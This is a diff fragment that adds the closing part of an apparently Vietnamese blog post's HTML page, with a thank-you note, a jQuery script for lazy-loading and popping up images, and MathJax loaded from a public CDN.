+  <p>Mình cũng xin cảm ơn người bạn đến từ đất cảng Mai Kim Long, mặc dù chỉ quen biết qua mạng xã hội nhưng vẫn dám cho mình mượn tài khoản GCP để làm bài này, thanks bro!</p>
+</blockquote>
+</div>
+</div>
+<script>
+    var imgEl = document.getElementsByTagName('img');
+    for (var i=0; i<imgEl.length; i++) {
+        if (imgEl[i].getAttribute('src') && imgEl[i].id != 'avatar') {
+        imgEl[i].setAttribute('data-src',imgEl[i].getAttribute('src'));
+        imgEl[i].removeAttribute('src'); //use only if you need to remove data-src attribute after setting src
+        }
+    }
+    $(function() {
+
+        const IMG_SCOPE = '.main .post';
+      
+        if ($(`${IMG_SCOPE} img`).length <= 0 ) {
+          return;
+        }
+      
+        /* lazy loading */
+      
+        const imgList = document.querySelectorAll(`${IMG_SCOPE} img[data-src]`);
+        const observer = lozad(imgList);
+        observer.observe();
+      
+        /* popup */
+      
+        $(`${IMG_SCOPE} p > img[data-src],${IMG_SCOPE} img[data-src].preview-img`).each(
+          function() {
+            let nextTag = $(this).next();
+            const title = nextTag.prop('tagName') === 'EM' ? nextTag.text() : '';
+            const src = $(this).attr('data-src'); // created by lozad.js
+      
+            $(this).wrap(`<a href="${src}" title="${title}" class="popup"></a>`);
+          }
+        );
+      
+        $('.popup').magnificPopup({
+          type: 'image',
+          closeOnContentClick: true,
+          showCloseBtn: false,
+          zoom: {
+            enabled: true,
+            duration: 300,
+            easing: 'ease-in-out'
+          }
+        });
+      
+        /* markup the image links */
+      
+        $(`${IMG_SCOPE} a`).has('img').addClass('img-link');
+      
+      });
+</script>
+            </div>
+            
+
+
+
+        </div>
+    </div>
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+          tex2jax: {
+            inlineMath: [['$','$'], ['\\(','\\)']],
+            processEscapes: true
+          }
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+</body>
+</html>
+
+
